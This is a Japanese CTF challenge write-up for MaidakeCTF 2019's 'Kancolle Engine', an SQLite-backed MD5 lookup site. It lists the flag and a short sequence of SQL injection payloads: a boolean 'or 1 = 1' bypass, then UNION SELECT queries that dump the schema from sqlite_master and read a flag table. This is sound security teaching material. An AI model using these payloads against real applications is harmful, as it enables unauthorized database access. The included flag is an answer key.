# Kancolle Engine

## 問題文
艦娘のMD5を検索できるサイトを作ってみました！
※sqlite3を使用しています。

## 添付ファイル
URL

## Flag
MaidakeCTF{Use_question_mark_placeholders_when_calling_SQL}

## 検証用URL
https://aokakes.work/CTF/MaidakeCTF2019/Kancolle_Engine/

## writeup
1. 1' or 1 = 1 -- 
2. 1' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, name FROM sqlite_master WHERE type='table' ORDER BY name -- 
4. 1' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, sql FROM sqlite_master WHERE type='table' ORDER BY name -- 
3. 1' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, this_is_flag FROM flag -- 
